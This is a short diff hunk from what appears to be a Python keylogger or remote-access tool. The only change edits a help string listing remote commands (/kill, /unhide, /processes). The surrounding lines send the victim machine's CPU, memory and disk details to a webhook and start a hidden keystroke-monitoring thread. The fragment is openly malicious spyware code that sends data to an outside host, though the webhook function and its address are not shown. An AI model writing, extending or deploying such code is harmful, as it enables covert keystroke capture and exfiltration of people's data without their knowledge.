@@ -251,7 +251,7 @@ send_to_webhook(f"CPU cores: {cpu_count}")
 send_to_webhook(f"CPU percent: {cpu_percent}%")
 send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
 send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
-send_to_webhook("Commands: /kill /unhide /processes")
+send_to_webhook("Commands: /kill /unhide /processes(VERY LAGGY!)")
 
 # Start all monitoring threads
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
